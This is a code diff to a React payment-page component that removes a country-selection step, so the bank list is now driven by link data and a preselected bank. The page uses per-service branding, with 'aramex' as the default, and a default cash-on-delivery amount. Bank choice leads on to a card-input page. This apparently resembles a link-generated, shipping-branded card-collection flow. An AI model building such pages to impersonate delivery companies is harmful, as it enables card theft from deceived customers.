@@ -4,10 +4,10 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { useLink } from "@/hooks/useSupabase";
-import { Building2, ChevronLeft, ArrowLeft, Loader2 } from "lucide-react";
+import { Building2, ArrowLeft, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { COUNTRIES, getCountryByCode } from "@/lib/countries";
+import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 
 const PaymentBankSelector = () => {
@@ -16,11 +16,16 @@ const PaymentBankSelector = () => {
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
   
-  const [selectedCountry, setSelectedCountry] = useState<string>("");
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
-  const [step, setStep] = useState<"country" | "bank">("country");
+  
+  // Get country from link data
+  const countryCode = linkData?.country_code || "";
+  const countryData = getCountryByCode(countryCode);
+  
+  // Get preselected bank from link payload if available
+  const preselectedBank = linkData?.payload?.selected_bank;
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
@@ -31,24 +36,23 @@ const PaymentBankSelector = () => {
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
-  // Load banks when country is selected
+  // Load banks when country is available from link data
   useEffect(() => {
-    if (selectedCountry && step === "bank") {
+    if (countryCode) {
       setLoadingBanks(true);
       // Simulate API call
       setTimeout(() => {
-        const countryBanks = getBanksByCountry(selectedCountry);
+        const countryBanks = getBanksByCountry(countryCode);
         setBanks(countryBanks);
         setLoadingBanks(false);
+        
+        // Auto-select bank if it was preselected during link creation
+        if (preselectedBank) {
+          setSelectedBank(preselectedBank);
+        }
       }, 300);
     }
-  }, [selectedCountry, step]);
-  
-  const handleCountrySelect = (countryCode: string) => {
-    setSelectedCountry(countryCode);
-    setSelectedBank("");
-    setStep("bank");
-  };
+  }, [countryCode, preselectedBank]);
   
   const handleBankSelect = (bankId: string) => {
     setSelectedBank(bankId);
@@ -56,7 +60,7 @@ const PaymentBankSelector = () => {
   
   const handleSkipBankSelection = () => {
     // Store selection in sessionStorage
-    sessionStorage.setItem('selectedCountry', selectedCountry);
+    sessionStorage.setItem('selectedCountry', countryCode);
     sessionStorage.setItem('selectedBank', 'skipped');
     
     toast({
@@ -68,20 +72,12 @@ const PaymentBankSelector = () => {
   };
   
   const handleContinue = () => {
-    if (step === "bank" && selectedBank) {
+    if (selectedBank) {
       // Store selection in sessionStorage
-      sessionStorage.setItem('selectedCountry', selectedCountry);
+      sessionStorage.setItem('selectedCountry', countryCode);
       sessionStorage.setItem('selectedBank', selectedBank);
       
       navigate(`/pay/${id}/card-input`);
-    }
-  };
-  
-  const handleBack = () => {
-    if (step === "bank") {
-      setStep("country");
-      setSelectedBank("");
-      setBanks([]);
     }
   };
   
@@ -132,76 +128,26 @@ const PaymentBankSelector = () => {
           </div>
           
           <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
-            {/* Header with Back Button */}
-            <div className="flex items-center justify-between mb-6">
-              <div className="flex items-center gap-3">
-                <div 
-                  className="w-12 h-12 rounded-xl flex items-center justify-center"
-                  style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                  }}
-                >
-                  <Building2 className="w-6 h-6 text-white" />
-                </div>
-                <div>
-                  <h1 className="text-xl sm:text-2xl font-bold">
-                    {step === "country" ? "اختر الدولة" : "اختر البنك"}
-                  </h1>
-                  <p className="text-sm text-muted-foreground">
-                    {step === "country" ? "حدد دولتك" : "اختياري - يمكنك التخطي"}
-                  </p>
-                </div>
+            {/* Header */}
+            <div className="flex items-center gap-3 mb-6">
+              <div 
+                className="w-12 h-12 rounded-xl flex items-center justify-center"
+                style={{
+                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                }}
+              >
+                <Building2 className="w-6 h-6 text-white" />
               </div>
-              
-              {step === "bank" && (
-                <Button
-                  variant="ghost"
-                  size="sm"
-                  onClick={handleBack}
-                  className="flex items-center gap-1"
-                >
-                  <ChevronLeft className="w-4 h-4" />
-                  <span>رجوع</span>
-                </Button>
-              )}
+              <div>
+                <h1 className="text-xl sm:text-2xl font-bold">اختر البنك</h1>
+                <p className="text-sm text-muted-foreground">
+                  اختياري - يمكنك التخطي
+                </p>
+              </div>
             </div>
             
-            {/* Country Selection */}
-            {step === "country" && (
-              <div className="space-y-3">
-                {COUNTRIES.map((country) => (
-                  <Button
-                    key={country.code}
-                    variant={selectedCountry === country.code ? "default" : "outline"}
-                    className="w-full h-auto p-4 justify-start text-right transition-all hover:shadow-md"
-                    onClick={() => handleCountrySelect(country.code)}
-                    style={
-                      selectedCountry === country.code
-                        ? {
-                            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-                            color: 'white'
-                          }
-                        : undefined
-                    }
-                  >
-                    <div className="flex items-center gap-3 w-full">
-                      <span className="text-3xl">{country.flag}</span>
-                      <div className="flex-1 text-right">
-                        <p className="font-bold text-base">{country.nameAr}</p>
-                        <p className="text-xs opacity-80">{country.name}</p>
-                      </div>
-                      {selectedCountry === country.code && (
-                        <ChevronLeft className="w-5 h-5 mr-2" />
-                      )}
-                    </div>
-                  </Button>
-                ))}
-              </div>
-            )}
-            
             {/* Bank Selection */}
-            {step === "bank" && (
-              <div className="space-y-4">
+            <div className="space-y-4">
                 {loadingBanks ? (
                   <div className="flex items-center justify-center py-12">
                     <Loader2 className="w-8 h-8 animate-spin" style={{ color: branding.colors.primary }} />
@@ -209,18 +155,20 @@ const PaymentBankSelector = () => {
                 ) : (
                   <>
                     {/* Selected Country Info */}
-                    <div 
-                      className="p-3 rounded-lg mb-4 flex items-center gap-3"
-                      style={{
-                        background: `${branding.colors.primary}10`,
-                        border: `1px solid ${branding.colors.primary}30`
-                      }}
-                    >
-                      <span className="text-2xl">{getCountryByCode(selectedCountry)?.flag}</span>
-                      <p className="text-sm font-semibold">
-                        {getCountryByCode(selectedCountry)?.nameAr}
-                      </p>
-                    </div>
+                    {countryData && (
+                      <div 
+                        className="p-3 rounded-lg mb-4 flex items-center gap-3"
+                        style={{
+                          background: `${branding.colors.primary}10`,
+                          border: `1px solid ${branding.colors.primary}30`
+                        }}
+                      >
+                        <span className="text-2xl">{countryData.flag}</span>
+                        <p className="text-sm font-semibold">
+                          {countryData.nameAr}
+                        </p>
+                      </div>
+                    )}
                     
                     {/* Banks Grid */}
                     <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
@@ -294,7 +242,6 @@ const PaymentBankSelector = () => {
                   </>
                 )}
               </div>
-            )}
           </Card>
         </div>
       </div>
